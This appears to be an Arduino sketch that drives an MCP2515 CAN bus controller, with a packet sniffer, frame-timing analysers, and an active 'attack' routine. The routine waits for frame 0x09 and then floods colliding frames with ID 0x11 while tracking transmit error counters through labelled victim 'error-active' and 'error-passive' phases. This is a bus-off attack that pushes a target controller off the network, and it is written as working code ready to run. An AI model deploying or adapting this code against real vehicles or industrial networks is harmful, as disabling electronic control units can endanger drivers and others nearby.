#include <mcp_can.h>
#include <SPI.h>

const int SPI_CS_PIN = 4;
MCP_CAN CAN(SPI_CS_PIN);

void setup() {
  Serial.begin(9600);
  while (!Serial) {
    ; // wait for serial port to connect. Needed for native USB
  }
  // Initialize MCP2515 running at 16MHz with a baudrate of 500kb/s and the masks and filters disabled.
  if (CAN.begin(MCP_ANY, CAN_500KBPS, MCP_16MHZ) == CAN_OK) {
    Serial.println("MCP2515 Initialized Successfully!");
  } else {
    Serial.println("Error Initializing MCP2515...");
  }
  // Set operation mode to normal so the MCP2515 sends acks to received data.
  CAN.setMode(MCP_NORMAL);
}

unsigned long rxId;
byte len = 0;
unsigned char buf[8];


bool done = false;

void loop() {
  // Switch between attack or sniff
  if (true) {
    if (!done) {
      int id = 0x11;//0x11
      //long freq = analyzePacketFreq(id, 1000);
      //long freq = analyzeTimeDiff(0x09, 0x11, 2000);
      attack(id, 12);
      done = true;
    }
  } else {
    packetSniff();
  }
}

void attack(unsigned long id, int frequency) {
  Serial.print("Attack packet with ID: 0x");
  Serial.print(id < 16 ? "0" : "");
  Serial.print(id, HEX);
  Serial.print(", with frequency: ");
  Serial.print(frequency);
  Serial.println(" us");
  while (true) {
    if (CAN_MSGAVAIL == CAN.checkReceive() && CAN_OK == CAN.readMsgBuf(&rxId, &len, buf)) {
      if ((rxId & 0x40000000) == 0x40000000) {
        Serial.println("REMOTE REQUEST FRAME");
      } else if (rxId == 0x09) {
        //Serial.println(interval_delay);
        //delayMicroseconds(5000);
        Serial.println("***********START***********");
        //Serial.println(x);
        //Serial.print("TEC: ");
        //Serial.println(CAN.errorCountTX());

        // Phase 1 - Victim in error-active mode
        do {
          sendMessage(id, 0, {});
        } while (CAN.errorCountTX() < 8/* && CAN.checkError() == CAN_OK*/);
        Serial.println("Enter phase 1");
        // Transition from phase 1 to 2
        for (int i = 0; i < 16; i++) {
          sendMessage(id, 0, {});
        }
        Serial.println("Transition");
        //Serial.println(CAN.errorCountTX());
        // Victim in error-passive mode
        bool err;
        int counter = CAN.errorCountTX(), prev_counter;
        do {
          prev_counter = counter;
          err = sendMessage(id, 0, {});
          counter = CAN.errorCountTX();
        } while(counter < prev_counter);
        Serial.println("************END************");
      }
    }
  }
}

bool sendMessage(unsigned long id, byte len, unsigned char* buf) {
  byte res = CAN.sendMsgBuf(id, len, buf);
  if (res != CAN_OK) {
    Serial.print("Error sending message 0x");
    Serial.print(id < 16 ? "0" : "");
    Serial.print(id, HEX);
  }
  if (res == CAN_GETTXBFTIMEOUT) {
    Serial.println(", get TX buff time out!");
  } else if (res == CAN_SENDMSGTIMEOUT) {
    Serial.println(", send msg timeout!");
  }
  return res == CAN_OK;
}

long analyzePacketFreq(unsigned long id, int max_count) {
  Serial.println("Start analyze packet...");
  int count = 0;
  long interval = 0, prev_interval = 0;
  long sum_interval = 0;

  while (count < max_count) {
    if (CAN_MSGAVAIL == CAN.checkReceive() && CAN_OK == CAN.readMsgBuf(&rxId, &len, buf)) {
      if (rxId == id && (rxId & 0x40000000) != 0x40000000) {
        interval = micros();
        long delta = interval - prev_interval;
        //Serial.println(delta);
        prev_interval = interval;
        sum_interval += delta;
        count++;
      }
    }
  }
  long delta = sum_interval / max_count;
  Serial.print("Packet with id 0x");
  Serial.print(id < 16 ? "0" : "");
  Serial.print(id, HEX);
  Serial.print(" sent every ");
  Serial.print(delta);
  Serial.println(" us");
  return delta;
}

long analyzeTimeDiff(int precededId, int id, int repetition) {
  bool checkPrecededId = true;
  int count = 0;
  long interval = 0;
  long sum_interval = 0;


  while (count < repetition) {
    if(!(CAN_MSGAVAIL == CAN.checkReceive() && CAN_OK == CAN.readMsgBuf(&rxId, &len, buf) && (rxId & 0x40000000) != 0x40000000)) {
      continue;
    }

    if (rxId == precededId && checkPrecededId) {
      interval = micros();
      checkPrecededId = false;
    } else if (rxId == id && !checkPrecededId) {
      long delta = micros() - interval;
      sum_interval += delta;
      count++;
      checkPrecededId = true;
    }
  }
  long delta = sum_interval / repetition;
  Serial.print("Time between id 0x");
  Serial.print(precededId < 16 ? "0" : "");
  Serial.print(precededId, HEX);
  Serial.print(" and id 0x");
  Serial.print(id < 16 ? "0" : "");
  Serial.print(id, HEX);
  Serial.print(" is ");
  Serial.print(delta);
  Serial.println(" us");
  return delta;
}

void packetSniff() {
  while (true) {
    if (CAN_MSGAVAIL == CAN.checkReceive() && CAN_OK == CAN.readMsgBuf(&rxId, &len, buf)) {
      if ((rxId & 0x40000000) == 0x40000000) {
        Serial.println("REMOTE REQUEST FRAME");
      } else {
        Serial.print("ID: 0x");
        Serial.print(rxId < 16 ? "0" : "");
        Serial.print(rxId, HEX);
        Serial.print("\tDLC: ");
        Serial.print(len);
        Serial.print("\t");
        for (byte i = 0; i < len; i++) {
          Serial.write(buf[i]);
          Serial.print("\t");
        }
        Serial.println();
      }
    }
  }
}


